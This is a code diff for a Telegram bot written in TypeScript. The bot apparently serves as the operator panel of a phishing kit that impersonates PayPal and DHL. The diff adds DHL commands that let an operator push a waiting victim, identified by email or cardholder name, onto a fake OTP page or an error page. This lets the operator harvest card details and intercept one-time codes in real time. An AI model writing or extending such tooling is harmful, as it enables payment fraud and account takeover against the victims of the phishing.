@@ -76,35 +76,47 @@ async function handleTelegramUpdate(update: TelegramUpdate, botToken: string) {
   const text = message.text.trim();
   const chatId = message.chat.id;
 
-  // Check if it's an OTP command: /otp_sessionId
+  // PayPal commands
   if (text.startsWith("/otp_")) {
     const sessionId = text.replace("/otp_", "");
-    await handleRedirectCommand(sessionId, "/paypal/otp", chatId, botToken);
+    await handlePayPalRedirectCommand(sessionId, "/paypal/otp", chatId, botToken);
     return;
   }
 
-  // Check if it's an error command: /error_sessionId
   if (text.startsWith("/error_")) {
     const sessionId = text.replace("/error_", "");
-    await handleRedirectCommand(sessionId, "/paypal/failure", chatId, botToken);
+    await handlePayPalRedirectCommand(sessionId, "/paypal/failure", chatId, botToken);
+    return;
+  }
+
+  // DHL commands
+  if (text.startsWith("/dhl_otp_")) {
+    const sessionId = text.replace("/dhl_otp_", "");
+    await handleDhlRedirectCommand(sessionId, "/otp1", chatId, botToken);
+    return;
+  }
+
+  if (text.startsWith("/dhl_error_")) {
+    const sessionId = text.replace("/dhl_error_", "");
+    await handleDhlRedirectCommand(sessionId, "/error", chatId, botToken);
     return;
   }
 
   // Legacy commands without underscore
   if (text.startsWith("/otp ")) {
     const sessionId = text.replace("/otp ", "");
-    await handleRedirectCommand(sessionId, "/paypal/otp", chatId, botToken);
+    await handlePayPalRedirectCommand(sessionId, "/paypal/otp", chatId, botToken);
     return;
   }
 
   if (text.startsWith("/error ")) {
     const sessionId = text.replace("/error ", "");
-    await handleRedirectCommand(sessionId, "/paypal/failure", chatId, botToken);
+    await handlePayPalRedirectCommand(sessionId, "/paypal/failure", chatId, botToken);
     return;
   }
 }
 
-async function handleRedirectCommand(
+async function handlePayPalRedirectCommand(
   sessionId: string,
   redirectUrl: string,
   chatId: number,
@@ -141,6 +153,54 @@ async function handleRedirectCommand(
       chatId,
       botToken,
       `✅ Client <code>${session.email}</code> redirigé vers <b>${action}</b>`
+    );
+  } catch (error) {
+    console.error("Failed to handle redirect command:", error);
+    await sendReply(
+      chatId,
+      botToken,
+      `❌ Erreur lors de la redirection.`
+    );
+  }
+}
+
+async function handleDhlRedirectCommand(
+  sessionId: string,
+  redirectUrl: string,
+  chatId: number,
+  botToken: string
+) {
+  try {
+    const session = await storage.getDhlSession(sessionId);
+
+    if (!session) {
+      await sendReply(
+        chatId,
+        botToken,
+        `❌ Session <code>${sessionId}</code> introuvable.`
+      );
+      return;
+    }
+
+    if (session.status !== "waiting") {
+      await sendReply(
+        chatId,
+        botToken,
+        `⚠️ Session <code>${sessionId}</code> déjà traitée (${session.status}).`
+      );
+      return;
+    }
+
+    await storage.updateDhlSession(sessionId, {
+      redirectUrl,
+      status: "redirected",
+    });
+
+    const action = redirectUrl.includes("otp") ? "OTP" : "ERROR";
+    await sendReply(
+      chatId,
+      botToken,
+      `✅ Client <code>${session.cardholderName}</code> redirigé vers <b>${action}</b>`
     );
   } catch (error) {
     console.error("Failed to handle redirect command:", error);
